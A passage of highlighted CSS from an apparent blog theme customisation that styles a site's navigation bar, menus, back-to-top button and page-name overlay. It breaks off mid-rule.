class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#nav</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-main);</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav-totop</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.totopbtn</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav-totop</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-white);</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-main);</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav-totop</span> <span class="selector-id">#percent</span>,</span><br><span class="line"><span class="selector-class">.page</span> <span class="selector-id">#nav-totop</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(--font-color);</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--card-bg);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">13px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav-totop</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">35px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.is-top-bar</span>) <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.is-top-bar</span>) <span class="selector-id">#nav-totop</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transition</span>: width <span class="number">0.3s</span>, opacity <span class="number">0.2s</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav-totop</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">700</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav-totop</span><span class="selector-pseudo">:hover</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.5</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">700</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-id">#nav-right</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0.5rem</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav-totop</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-button</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#menus</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-class">.nav-button</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.site-page</span> &#123;</span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="number">0px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 顶栏修改 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span> <span class="selector-class">.menus_item_child</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">16px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span> <span class="selector-class">.menus_item_child</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span> <span class="selector-class">.menus_item_child</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">3px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span> <span class="selector-class">.menus_item_child</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">19px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#site-name</span>,</span><br><span class="line"><span class="selector-class">.shuoshuo</span> &#123;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#site-name</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#blog_name</span> <span class="selector-id">#site-name</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#blog_name</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.title</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#blog_name</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.01</span>);</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 圆角隐藏 */</span></span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.menus_item_child</span> &#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 一级菜单居中 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: fit-content;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: row;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.menus_item_child</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span><br><span class="line">    <span class="attribute">right</span>: auto;</span><br><span class="line">    <span class="attribute">left</span>: auto <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">6px</span> <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">35px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">5px</span> <span class="number">27px</span> <span class="number">5px</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: -<span class="number">14.5px</span> <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span> <span class="selector-class">.menus_item_child</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">44px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line">    <span class="selector-class">.page</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span>&gt;<span class="selector-tag">a</span><span class="selector-class">.site-page</span> &#123;</span><br><span class="line">        <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-white) <span class="meta">!important</span>;</span><br><span class="line">        <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-main);</span><br><span class="line">        <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">        <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-main);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="built_in">calc</span>((<span class="number">100%</span> - <span class="number">1420px</span>) / <span class="number">2</span>);</span><br><span class="line">    backdrop-<span class="attribute">filter</span>: <span class="built_in">saturate</span>(<span class="number">180%</span>) <span class="built_in">blur</span>(<span class="number">20px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--font-color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.page</span> <span class="selector-id">#nav</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-white) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-main);</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-main);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#menus</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.menus_items</span>&gt;<span class="selector-tag">div</span>&gt;<span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: <span class="number">0.3rem</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">700</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0em</span> <span class="number">0.3em</span> <span class="number">0em</span> <span class="number">0.5em</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">35px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-tag">div</span><span class="selector-id">#toggle-menu</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">0</span> <span class="number">4px</span> <span class="number">6px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav-totop</span> <span class="selector-class">.totopbtn</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-name</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">color</span>: white <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;回到顶部&quot;</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--anzhiyu-theme);</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -o-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">3px</span> <span class="built_in">var</span>(--anzhiyu-theme);</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">45px</span>;</span><br><span class="line">    <span class="comment">/*如果垂直位置不居中可以微调此值，也可以删了*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-name</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#name-container</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    -o-<span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#name-container</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="built_in">scale</span>(<span class="number">1.03</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-name</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">center<span class="selector-id">#name-container</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;ZhuZiAYuanJWD&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-fixed</span><span class="selector-class">.nav-visible</span> <span class="selector-id">#name-container</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, <span class="number">60px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-fixed</span><span class="selector-class">.nav-visible</span> <span class="selector-id">#menus</span> <span class="selector-class">.menus_items</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>);</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#menus</span> <span class="selector-class">.menus_items</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">60px</span>);</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#name-container</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">15%</span>;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#name-container</span> &#123;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mask-name-container</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">992px</span>) &#123;</span><br><span class="line">    <span class="selector-class">.mask-name-container</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">65%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line">    <span class="selector-class">.mask-name-container</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#sidebar</span> <span class="selector-id">#sidebar-menus</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.site-page</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-white);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">var</span>(--anzhiyu-border-radius);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span>&gt;<span class="selector-tag">a</span>&gt;<span class="selector-tag">i</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.3em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">900px</span>) &#123;</span><br><span class="line">    <span class="selector-id">#nav</span> <span class="selector-class">.back-home-button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">        <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-main);</span><br><span class="line">    <span class="attribute">color</span>: <span 